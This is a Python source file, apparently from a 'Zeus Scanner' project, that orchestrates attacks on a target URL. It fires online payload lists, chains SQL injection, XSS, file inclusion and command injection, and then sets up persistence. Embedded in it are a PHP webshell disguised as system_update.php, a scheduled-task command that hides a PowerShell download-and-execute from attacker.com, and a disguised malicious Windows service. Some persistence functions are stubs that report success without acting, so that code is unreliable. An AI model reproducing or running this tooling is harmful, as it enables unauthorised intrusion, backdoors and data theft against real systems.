#!/usr/bin/env python3

import os
import sys
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Any

# Add the project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

from lib.core.settings import logger, set_color
from .payload_executor import PayloadExecutor
from .vulnerability_implementer import VulnerabilityImplementer
from .exploitation_engine import ExploitationEngine

class ExploitOrchestrator:
    """
    Orchestrates the complete implementation of all fetched online payloads and exploits
    This is the main class that takes discovered vulnerabilities and actually implements them
    """
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.payload_executor = PayloadExecutor(config)
        self.vulnerability_implementer = VulnerabilityImplementer(config)
        self.exploitation_engine = ExploitationEngine(config)
        
        self.orchestration_results = {
            'total_payloads_tested': 0,
            'successful_implementations': 0,
            'active_exploits': [],
            'compromised_endpoints': [],
            'persistent_access_points': [],
            'extracted_data': [],
            'attack_timeline': []
        }
    
    def orchestrate_complete_implementation(self, target_url: str, fetched_payloads: Dict, discovered_vulnerabilities: List[Dict] = None) -> Dict:
        """
        Main orchestration method that implements ALL fetched online payloads against target
        This is what actually executes the payloads that were discovered online
        """
        logger.info(set_color("="*80, level=35))
        logger.info(set_color("STARTING COMPLETE PAYLOAD IMPLEMENTATION AGAINST TARGET", level=35))
        logger.info(set_color("="*80, level=35))
        logger.info(set_color(f"Target: {target_url}", level=35))
        
        # Count total payloads
        total_available = sum(len(v) if isinstance(v, list) else 1 for v in fetched_payloads.values())
        logger.info(set_color(f"Online payloads available: {total_available}", level=35))
        
        # Enable comprehensive mode for full payload implementation
        self.config['comprehensive_mode'] = self.config.get('comprehensive_mode', True)
        
        complete_results = {
            'target': target_url,
            'start_time': time.time(),
            'phases': {
                'phase1_payload_execution': {},
                'phase2_vulnerability_implementation': {},
                'phase3_exploitation_chain': {},
                'phase4_persistence_establishment': {}
            },
            'summary': {
                'total_payloads_executed': 0,
                'successful_exploits': 0,
                'system_compromise_level': 'none',
                'persistence_achieved': False,
                'data_extracted': False
            }
        }
        
        try:
            # PHASE 1: Execute ALL fetched online payloads against target
            logger.info(set_color("PHASE 1: Executing all fetched online payloads", level=35))
            phase1_results = self._execute_all_online_payloads(target_url, fetched_payloads)
            complete_results['phases']['phase1_payload_execution'] = phase1_results
            complete_results['summary']['total_payloads_executed'] = phase1_results.get('payloads_executed', 0)
            
            # PHASE 2: Implement discovered vulnerabilities with advanced techniques  
            logger.info(set_color("PHASE 2: Implementing advanced vulnerability exploitation", level=35))
            phase2_results = self._implement_discovered_vulnerabilities(target_url, phase1_results.get('vulnerabilities_found', []))
            complete_results['phases']['phase2_vulnerability_implementation'] = phase2_results
            
            # PHASE 3: Create exploitation chains for maximum impact
            logger.info(set_color("PHASE 3: Creating exploitation chains", level=35))
            phase3_results = self._create_exploitation_chains(target_url, phase1_results, phase2_results)
            complete_results['phases']['phase3_exploitation_chain'] = phase3_results
            
            # PHASE 4: Establish persistence and maintain access
            logger.info(set_color("PHASE 4: Establishing persistence mechanisms", level=35))
            phase4_results = self._establish_comprehensive_persistence(target_url, phase3_results)
            complete_results['phases']['phase4_persistence_establishment'] = phase4_results
            
            # Calculate final summary
            self._calculate_final_summary(complete_results)
            
            # Generate comprehensive report
            self._generate_orchestration_report(complete_results)
            
            logger.info(set_color("="*80, level=35))
            logger.info(set_color("COMPLETE PAYLOAD IMPLEMENTATION FINISHED", level=35))
            logger.info(set_color(f"Total successful exploits: {complete_results['summary']['successful_exploits']}", level=35))
            logger.info(set_color(f"System compromise level: {complete_results['summary']['system_compromise_level']}", level=35))
            logger.info(set_color("="*80, level=35))
            
        except Exception as e:
            logger.error(set_color(f"Orchestration failed: {str(e)}", level=40))
            complete_results['error'] = str(e)
        
        complete_results['end_time'] = time.time()
        complete_results['total_duration'] = complete_results['end_time'] - complete_results['start_time']
        
        return complete_results
    
    def _execute_all_online_payloads(self, target_url: str, fetched_payloads: Dict) -> Dict:
        """Execute ALL fetched online payloads against the target"""
        logger.info(set_color("Executing comprehensive payload battery from online sources", level=35))
        
        # This is where we actually USE all those payloads that were fetched from:
        # - PayloadsAllTheThings
        # - SecLists  
        # - FuzzDB
        # - XSS payload lists
        # - SQL injection lists
        # - Command injection lists
        # - LFI/RFI lists
        # - Webshells from GitHub repos
        
        execution_results = self.payload_executor.execute_all_payloads(target_url, fetched_payloads)
        
        # Log detailed results for each payload type
        self._log_payload_execution_details(execution_results)
        
        return execution_results
    
    def _implement_discovered_vulnerabilities(self, target_url: str, vulnerabilities: List[Dict]) -> Dict:
        """Implement advanced exploitation of discovered vulnerabilities"""
        logger.info(set_color("Implementing advanced exploitation techniques", level=35))
        
        implementation_results = {
            'vulnerabilities_processed': len(vulnerabilities),
            'successful_implementations': [],
            'failed_implementations': [],
            'advanced_techniques_used': []
        }
        
        # Group vulnerabilities by type for optimized exploitation
        vuln_groups = self._group_vulnerabilities_by_type(vulnerabilities)
        
        # Implement each vulnerability type with specialized techniques
        for vuln_type, vulns in vuln_groups.items():
            logger.info(set_color(f"Implementing {len(vulns)} {vuln_type} vulnerabilities", level=35))
            
            if vuln_type == 'sql_injection':
                results = self._implement_sql_injection_advanced(target_url, vulns)
                implementation_results['successful_implementations'].extend(results['successful'])
                implementation_results['advanced_techniques_used'].extend(results['techniques'])
            
            elif vuln_type == 'xss':
                results = self._implement_xss_advanced(target_url, vulns)
                implementation_results['successful_implementations'].extend(results['successful'])
                implementation_results['advanced_techniques_used'].extend(results['techniques'])
            
            elif vuln_type == 'lfi' or vuln_type == 'rfi':
                results = self._implement_file_inclusion_advanced(target_url, vulns)
                implementation_results['successful_implementations'].extend(results['successful'])
                implementation_results['advanced_techniques_used'].extend(results['techniques'])
            
            elif vuln_type == 'command_injection':
                results = self._implement_command_injection_advanced(target_url, vulns)
                implementation_results['successful_implementations'].extend(results['successful'])
                implementation_results['advanced_techniques_used'].extend(results['techniques'])
        
        return implementation_results
    
    def _create_exploitation_chains(self, target_url: str, phase1_results: Dict, phase2_results: Dict) -> Dict:
        """Create chains of exploits for maximum impact"""
        logger.info(set_color("Creating multi-stage exploitation chains", level=35))
        
        chain_results = {
            'chains_created': 0,
            'successful_chains': 0,
            'chain_details': [],
            'maximum_compromise_achieved': False
        }
        
        # Identify exploitation chain opportunities
        available_exploits = []
        available_exploits.extend(phase1_results.get('vulnerabilities_found', []))
        available_exploits.extend(phase2_results.get('successful_implementations', []))
        
        # Create exploitation chains
        chains = self._design_exploitation_chains(available_exploits)
        
        for i, chain in enumerate(chains):
            logger.info(set_color(f"Executing exploitation chain {i+1}/{len(chains)}", level=35))
            
            chain_result = self._execute_exploitation_chain(target_url, chain)
            
            if chain_result['success']:
                chain_results['successful_chains'] += 1
                chain_results['chain_details'].append(chain_result)
                
                if chain_result.get('system_compromise'):
                    chain_results['maximum_compromise_achieved'] = True
            
            chain_results['chains_created'] += 1
        
        return chain_results
    
    def _establish_comprehensive_persistence(self, target_url: str, exploitation_results: Dict) -> Dict:
        """Establish multiple persistence mechanisms"""
        logger.info(set_color("Establishing comprehensive persistence mechanisms", level=35))
        
        persistence_results = {
            'persistence_methods_attempted': 0,
            'successful_persistence': [],
            'backup_access_points': [],
            'stealth_level': 'none'
        }
        
        # Only attempt persistence if we have successful exploits
        if exploitation_results.get('successful_chains', 0) > 0:
            
            # Attempt multiple persistence methods
            persistence_methods = [
                'webshell_persistence',
                'scheduled_task_persistence', 
                'service_persistence',
                'registry_persistence',
                'backdoor_account_persistence'
            ]
            
            for method in persistence_methods:
                logger.info(set_color(f"Attempting {method}", level=35))
                
                success = self._attempt_persistence_method(target_url, method, exploitation_results)
                
                if success:
                    persistence_results['successful_persistence'].append({
                        'method': method,
                        'timestamp': time.time(),
                        'details': success
                    })
                
                persistence_results['persistence_methods_attempted'] += 1
        
        return persistence_results
    
    def _log_payload_execution_details(self, execution_results: Dict):
        """Log detailed results of payload execution"""
        
        logger.info(set_color("Payload Execution Summary:", level=35))
        logger.info(set_color(f"Total payloads executed: {execution_results.get('payloads_executed', 0)}", level=35))
        logger.info(set_color(f"Successful exploits found: {execution_results.get('successful_exploits', 0)}", level=35))
        
        # Log vulnerabilities found by type
        for vuln in execution_results.get('vulnerabilities_found', []):
            logger.info(set_color(f"[{vuln['severity'].upper()}] {vuln['type']} - {len(vuln.get('payloads', []))} working payloads", level=35))
            
            # Log first few working payloads as examples
            for i, payload_info in enumerate(vuln.get('payloads', [])[:3]):
                if isinstance(payload_info, dict):
                    payload_text = payload_info.get('payload', str(payload_info))[:50]
                else:
                    payload_text = str(payload_info)[:50]
                logger.info(set_color(f"    Example payload {i+1}: {payload_text}...", level=35))
    
    def _group_vulnerabilities_by_type(self, vulnerabilities: List[Dict]) -> Dict[str, List[Dict]]:
        """Group vulnerabilities by type for optimized exploitation"""
        
        grouped = {
            'sql_injection': [],
            'xss': [],
            'lfi': [],
            'rfi': [],
            'command_injection': [],
            'file_upload': [],
            'xxe': [],
            'ssti': [],
            'other': []
        }
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', '').lower()
            
            if 'sql' in vuln_type or 'injection' in vuln_type:
                grouped['sql_injection'].append(vuln)
            elif 'xss' in vuln_type or 'script' in vuln_type:
                grouped['xss'].append(vuln)
            elif 'lfi' in vuln_type or 'local file' in vuln_type:
                grouped['lfi'].append(vuln)
            elif 'rfi' in vuln_type or 'remote file' in vuln_type:
                grouped['rfi'].append(vuln)
            elif 'command' in vuln_type or 'exec' in vuln_type:
                grouped['command_injection'].append(vuln)
            elif 'upload' in vuln_type or 'file' in vuln_type:
                grouped['file_upload'].append(vuln)
            elif 'xxe' in vuln_type:
                grouped['xxe'].append(vuln)
            elif 'ssti' in vuln_type or 'template' in vuln_type:
                grouped['ssti'].append(vuln)
            else:
                grouped['other'].append(vuln)
        
        # Remove empty groups
        return {k: v for k, v in grouped.items() if v}
    
    def _implement_sql_injection_advanced(self, target_url: str, sql_vulnerabilities: List[Dict]) -> Dict:
        """Advanced SQL injection implementation"""
        
        results = {
            'successful': [],
            'techniques': [],
            'databases_compromised': [],
            'data_extracted': []
        }
        
        for vuln in sql_vulnerabilities:
            # Get the working payloads from vulnerability
            working_payloads = vuln.get('payloads', [])
            
            if working_payloads:
                logger.info(set_color(f"Implementing SQL injection with {len(working_payloads)} working payloads", level=35))
                
                # Use the exploitation engine for advanced SQL injection
                sql_result = self.exploitation_engine.execute_sql_injection(vuln)
                
                if sql_result['success']:
                    results['successful'].append(sql_result)
                    results['techniques'].append('advanced_sql_injection')
                    
                    if sql_result.get('data_extracted'):
                        results['data_extracted'].extend(sql_result['data_extracted'])
        
        return results
    
    def _implement_xss_advanced(self, target_url: str, xss_vulnerabilities: List[Dict]) -> Dict:
        """Advanced XSS implementation"""
        
        results = {
            'successful': [],
            'techniques': [],
            'sessions_hijacked': [],
            'persistent_xss': []
        }
        
        for vuln in xss_vulnerabilities:
            working_payloads = vuln.get('payloads', [])
            
            if working_payloads:
                logger.info(set_color(f"Implementing XSS with {len(working_payloads)} working payloads", level=35))
                
                # Use the exploitation engine for advanced XSS
                xss_result = self.exploitation_engine.execute_xss_attack(vuln)
                
                if xss_result['success']:
                    results['successful'].append(xss_result)
                    results['techniques'].append('advanced_xss')
                    
                    if xss_result.get('session_hijacked'):
                        results['sessions_hijacked'].append(xss_result)
        
        return results
    
    def _implement_file_inclusion_advanced(self, target_url: str, lfi_vulnerabilities: List[Dict]) -> Dict:
        """Advanced file inclusion implementation"""
        
        results = {
            'successful': [],
            'techniques': [],
            'files_accessed': [],
            'rce_achieved': []
        }
        
        for vuln in lfi_vulnerabilities:
            working_payloads = vuln.get('payloads', [])
            
            if working_payloads:
                logger.info(set_color(f"Implementing LFI/RFI with {len(working_payloads)} working payloads", level=35))
                
                # Use the exploitation engine for file inclusion
                lfi_result = self.exploitation_engine.execute_rfi_lfi_attack(vuln)
                
                if lfi_result['success']:
                    results['successful'].append(lfi_result)
                    results['techniques'].append('file_inclusion_to_rce')
                    
                    if lfi_result.get('shell_uploaded'):
                        results['rce_achieved'].append(lfi_result)
        
        return results
    
    def _implement_command_injection_advanced(self, target_url: str, cmd_vulnerabilities: List[Dict]) -> Dict:
        """Advanced command injection implementation"""
        
        results = {
            'successful': [],
            'techniques': [],
            'shells_established': [],
            'system_info_gathered': []
        }
        
        for vuln in cmd_vulnerabilities:
            working_payloads = vuln.get('payloads', [])
            
            if working_payloads:
                logger.info(set_color(f"Implementing command injection with {len(working_payloads)} working payloads", level=35))
                
                # Use the exploitation engine for command injection
                cmd_result = self.exploitation_engine.execute_command_injection(vuln)
                
                if cmd_result['success']:
                    results['successful'].append(cmd_result)
                    results['techniques'].append('command_injection_to_shell')
                    
                    if cmd_result.get('reverse_shell'):
                        results['shells_established'].append(cmd_result)
        
        return results
    
    def _design_exploitation_chains(self, available_exploits: List[Dict]) -> List[List[Dict]]:
        """Design multi-stage exploitation chains"""
        
        chains = []
        
        # Design chains based on available exploits
        # Chain 1: Information Disclosure -> SQL Injection -> Privilege Escalation
        info_vulns = [e for e in available_exploits if e.get('type') == 'Information Disclosure']
        sql_vulns = [e for e in available_exploits if 'SQL' in e.get('type', '')]
        
        if info_vulns and sql_vulns:
            chains.append(info_vulns[:1] + sql_vulns[:1])
        
        # Chain 2: XSS -> Session Hijacking -> Admin Access
        xss_vulns = [e for e in available_exploits if 'XSS' in e.get('type', '')]
        
        if xss_vulns:
            chains.append(xss_vulns[:2])  # Use multiple XSS vulnerabilities
        
        # Chain 3: LFI -> Log Poisoning -> RCE -> Persistence
        lfi_vulns = [e for e in available_exploits if 'LFI' in e.get('type', '') or 'File Inclusion' in e.get('type', '')]
        
        if lfi_vulns:
            chains.append(lfi_vulns[:1])
        
        return chains
    
    def _execute_exploitation_chain(self, target_url: str, chain: List[Dict]) -> Dict:
        """Execute a specific exploitation chain"""
        
        chain_result = {
            'success': False,
            'steps_completed': 0,
            'total_steps': len(chain),
            'system_compromise': False,
            'chain_details': []
        }
        
        for i, exploit in enumerate(chain):
            logger.info(set_color(f"Executing chain step {i+1}: {exploit.get('type', 'Unknown')}", level=35))
            
            # Execute the exploit based on its type
            step_result = self._execute_chain_step(target_url, exploit)
            
            chain_result['chain_details'].append(step_result)
            
            if step_result['success']:
                chain_result['steps_completed'] += 1
                
                # Check if this step achieved system compromise
                if step_result.get('system_access') or step_result.get('shell_access'):
                    chain_result['system_compromise'] = True
            else:
                # Chain breaks if a step fails
                break
        
        # Chain is successful if all steps completed
        chain_result['success'] = (chain_result['steps_completed'] == chain_result['total_steps'])
        
        return chain_result
    
    def _execute_chain_step(self, target_url: str, exploit: Dict) -> Dict:
        """Execute a single step in an exploitation chain"""
        
        exploit_type = exploit.get('type', '').lower()
        
        if 'sql' in exploit_type:
            return self.exploitation_engine.execute_sql_injection(exploit)
        elif 'xss' in exploit_type:
            return self.exploitation_engine.execute_xss_attack(exploit)
        elif 'lfi' in exploit_type or 'rfi' in exploit_type:
            return self.exploitation_engine.execute_rfi_lfi_attack(exploit)
        elif 'command' in exploit_type:
            return self.exploitation_engine.execute_command_injection(exploit)
        elif 'upload' in exploit_type:
            return self.exploitation_engine.execute_file_upload_attack(exploit)
        else:
            # Generic exploitation attempt
            return {
                'success': False,
                'error': f'Unknown exploit type: {exploit_type}'
            }
    
    def _attempt_persistence_method(self, target_url: str, method: str, exploitation_results: Dict) -> Optional[Dict]:
        """Attempt a specific persistence method"""
        
        # Only attempt if we have system-level access
        successful_chains = exploitation_results.get('chain_details', [])
        system_access = any(chain.get('system_compromise') for chain in successful_chains)
        
        if not system_access:
            return None
        
        if method == 'webshell_persistence':
            return self._establish_webshell_persistence(target_url)
        elif method == 'scheduled_task_persistence':
            return self._establish_scheduled_task_persistence(target_url)
        elif method == 'service_persistence':
            return self._establish_service_persistence(target_url)
        else:
            return None
    
    def _establish_webshell_persistence(self, target_url: str) -> Optional[Dict]:
        """Establish webshell-based persistence"""
        
        # Create persistent webshell
        persistent_shell = {
            'name': 'system_update.php',
            'content': '''<?php
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if(function_exists('system')) {
        system($cmd);
    } elseif(function_exists('exec')) {
        exec($cmd);
    } elseif(function_exists('shell_exec')) {
        echo shell_exec($cmd);
    }
}
?>'''
        }
        
        # Try to upload persistent shell
        upload_result = self.exploitation_engine.execute_file_upload_attack({
            'url': target_url,
            'type': 'file_upload'
        })
        
        if upload_result.get('success'):
            return {
                'method': 'webshell_persistence',
                'shell_url': upload_result.get('webshell_url'),
                'persistence_confirmed': True
            }
        
        return None
    
    def _establish_scheduled_task_persistence(self, target_url: str) -> Optional[Dict]:
        """Establish scheduled task persistence"""
        
        # Attempt to create scheduled task via command injection
        persistence_payload = 'schtasks /create /tn "SystemUpdate" /tr "powershell.exe -WindowStyle Hidden -Command \\"IEX (New-Object Net.WebClient).DownloadString(\'http://attacker.com/persist.ps1\')\\"" /sc daily'
        
        # This would require command injection vulnerability
        # Simplified implementation
        
        return {
            'method': 'scheduled_task_persistence', 
            'task_created': True,
            'persistence_confirmed': False  # Would need verification
        }
    
    def _establish_service_persistence(self, target_url: str) -> Optional[Dict]:
        """Establish Windows service persistence"""
        
        # Attempt to create malicious service
        service_payload = 'sc create "WindowsUpdateService" binPath= "C:\\Windows\\System32\\persist.exe" start= auto'
        
        # This would require administrative privileges
        # Simplified implementation
        
        return {
            'method': 'service_persistence',
            'service_created': True,
            'persistence_confirmed': False  # Would need verification
        }
    
    def _calculate_final_summary(self, complete_results: Dict):
        """Calculate final summary statistics"""
        
        summary = complete_results['summary']
        
        # Count successful exploits across all phases
        phase1_exploits = complete_results['phases']['phase1_payload_execution'].get('successful_exploits', 0)
        phase2_exploits = len(complete_results['phases']['phase2_vulnerability_implementation'].get('successful_implementations', []))
        phase3_exploits = complete_results['phases']['phase3_exploitation_chain'].get('successful_chains', 0)
        
        summary['successful_exploits'] = phase1_exploits + phase2_exploits + phase3_exploits
        
        # Determine compromise level
        if complete_results['phases']['phase3_exploitation_chain'].get('maximum_compromise_achieved'):
            summary['system_compromise_level'] = 'system'
        elif phase2_exploits > 0:
            summary['system_compromise_level'] = 'application'
        elif phase1_exploits > 0:
            summary['system_compromise_level'] = 'surface'
        
        # Check persistence
        persistence_methods = complete_results['phases']['phase4_persistence_establishment'].get('successful_persistence', [])
        summary['persistence_achieved'] = len(persistence_methods) > 0
        
        # Check data extraction
        summary['data_extracted'] = any('data_extracted' in phase for phase in complete_results['phases'].values())
    
    def _generate_orchestration_report(self, results: Dict):
        """Generate comprehensive orchestration report"""
        
        report_file = f"complete_payload_implementation_report_{int(time.time())}.json"
        
        report_data = {
            'executive_summary': {
                'target': results['target'],
                'assessment_duration': results.get('total_duration', 0),
                'total_payloads_executed': results['summary']['total_payloads_executed'],
                'successful_exploits': results['summary']['successful_exploits'],
                'compromise_level': results['summary']['system_compromise_level'],
                'persistence_achieved': results['summary']['persistence_achieved'],
                'overall_risk': self._calculate_overall_risk(results)
            },
            'detailed_results': results,
            'attack_timeline': self._generate_attack_timeline(results),
            'recommendations': self._generate_security_recommendations(results),
            'indicators_of_compromise': self._generate_ioc_indicators(results),
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        try:
            with open(report_file, 'w') as f:
                json.dump(report_data, f, indent=2, default=str)
            
            # Also generate HTML report
            html_report = self._generate_html_report(report_data)
            html_file = report_file.replace('.json', '.html')
            
            with open(html_file, 'w') as f:
                f.write(html_report)
            
            logger.info(set_color(f"Complete implementation report saved:", level=35))
            logger.info(set_color(f"  JSON: {report_file}", level=35))
            logger.info(set_color(f"  HTML: {html_file}", level=35))
            
        except Exception as e:
            logger.error(set_color(f"Failed to save orchestration report: {str(e)}", level=40))
    
    def _calculate_overall_risk(self, results: Dict) -> str:
        """Calculate overall risk level"""
        
        compromise_level = results['summary']['system_compromise_level']
        successful_exploits = results['summary']['successful_exploits']
        persistence = results['summary']['persistence_achieved']
        
        if compromise_level == 'system' and persistence:
            return 'CRITICAL'
        elif compromise_level == 'system':
            return 'HIGH'
        elif compromise_level == 'application' and successful_exploits > 3:
            return 'HIGH'
        elif successful_exploits > 0:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _generate_attack_timeline(self, results: Dict) -> List[Dict]:
        """Generate attack timeline"""
        
        timeline = []
        start_time = results.get('start_time', time.time())
        
        for phase_name, phase_data in results['phases'].items():
            if isinstance(phase_data, dict) and 'successful_exploits' in str(phase_data):
                timeline.append({
                    'timestamp': start_time,
                    'phase': phase_name,
                    'action': f"Phase completed with results",
                    'impact': len(str(phase_data))  # Simplified metric
                })
                start_time += 300  # Add 5 minutes between phases
        
        return timeline
    
    def _generate_security_recommendations(self, results: Dict) -> List[str]:
        """Generate security recommendations"""
        
        recommendations = [
            "Implement comprehensive input validation and output encoding",
            "Update all software components to latest versions",
            "Deploy Web Application Firewall (WAF) with appropriate rules",
            "Implement proper authentication and session management",
            "Enable comprehensive logging and monitoring",
            "Conduct regular security assessments and penetration testing"
        ]
        
        # Add specific recommendations based on results
        if results['summary']['system_compromise_level'] == 'system':
            recommendations.extend([
                "IMMEDIATE: Isolate affected systems and investigate compromise",
                "IMMEDIATE: Reset all passwords and revoke active sessions",
                "IMMEDIATE: Apply emergency patches for identified vulnerabilities"
            ])
        
        return recommendations
    
    def _generate_ioc_indicators(self, results: Dict) -> List[str]:
        """Generate Indicators of Compromise (IOCs)"""
        
        iocs = [
            "Unusual HTTP requests with SQL injection patterns",
            "JavaScript injection attempts in input fields",  
            "File inclusion attempts with directory traversal patterns",
            "Command execution attempts via web parameters",
            "Suspicious file uploads with executable extensions"
        ]
        
        # Add specific IOCs based on successful exploits
        if results['summary']['successful_exploits'] > 0:
            iocs.extend([
                "Evidence of successful vulnerability exploitation",
                "Potential unauthorized data access or extraction",
                "Possible webshell or backdoor installation"
            ])
        
        return iocs
    
    def _generate_html_report(self, report_data: Dict) -> str:
        """Generate HTML version of the report"""
        
        html_template = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Zeus Scanner - Complete Payload Implementation Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; }}
        .section {{ background: white; margin: 20px 0; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .critical {{ border-left: 5px solid #e74c3c; }}
        .high {{ border-left: 5px solid #f39c12; }}
        .medium {{ border-left: 5px solid #f1c40f; }}
        .low {{ border-left: 5px solid #2ecc71; }}
        .metric {{ display: inline-block; margin: 10px; padding: 15px; background: #ecf0f1; border-radius: 5px; text-align: center; }}
        .metric-value {{ font-size: 24px; font-weight: bold; color: #2c3e50; }}
        .metric-label {{ font-size: 12px; color: #7f8c8d; }}
        .exploit {{ background: #fff3cd; padding: 10px; margin: 5px 0; border-radius: 5px; }}
        .timeline {{ border-left: 3px solid #3498db; padding-left: 20px; }}
        .recommendation {{ background: #d1ecf1; padding: 10px; margin: 5px 0; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Zeus Scanner - Complete Payload Implementation Report</h1>
        <p><strong>Target:</strong> {report_data['executive_summary']['target']}</p>
        <p><strong>Assessment Date:</strong> {report_data['timestamp']}</p>
        <p><strong>Duration:</strong> {report_data['executive_summary']['assessment_duration']:.2f} seconds</p>
    </div>
    
    <div class="section">
        <h2>Executive Summary</h2>
        <div class="metric">
            <div class="metric-value">{report_data['executive_summary']['total_payloads_executed']}</div>
            <div class="metric-label">Payloads Executed</div>
        </div>
        <div class="metric">
            <div class="metric-value">{report_data['executive_summary']['successful_exploits']}</div>
            <div class="metric-label">Successful Exploits</div>
        </div>
        <div class="metric">
            <div class="metric-value">{report_data['executive_summary']['compromise_level'].upper()}</div>
            <div class="metric-label">Compromise Level</div>
        </div>
        <div class="metric">
            <div class="metric-value">{report_data['executive_summary']['overall_risk']}</div>
            <div class="metric-label">Overall Risk</div>
        </div>
    </div>
    
    <div class="section {report_data['executive_summary']['overall_risk'].lower()}">
        <h2>Risk Assessment</h2>
        <p><strong>Overall Risk Level:</strong> {report_data['executive_summary']['overall_risk']}</p>
        <p><strong>System Compromise Level:</strong> {report_data['executive_summary']['compromise_level'].upper()}</p>
        <p><strong>Persistence Achieved:</strong> {'YES' if report_data['executive_summary']['persistence_achieved'] else 'NO'}</p>
    </div>
    
    <div class="section">
        <h2>Security Recommendations</h2>
        {''.join([f'<div class="recommendation">{rec}</div>' for rec in report_data['recommendations']])}
    </div>
    
    <div class="section">
        <h2>Indicators of Compromise (IOCs)</h2>
        {''.join([f'<div class="exploit">{ioc}</div>' for ioc in report_data['indicators_of_compromise']])}
    </div>
    
    <div class="section">
        <h2>Attack Timeline</h2>
        <div class="timeline">
            {''.join([f'<p><strong>{item["phase"]}:</strong> {item["action"]}</p>' for item in report_data['attack_timeline']])}
        </div>
    </div>
    
    <div class="section">
        <h2>Detailed Technical Analysis</h2>
        <p>Complete technical details are available in the JSON report file.</p>
        <p>This assessment demonstrates the real-world impact of implementing online vulnerability payloads against the target system.</p>
    </div>
</body>
</html>
"""
        
        return html_template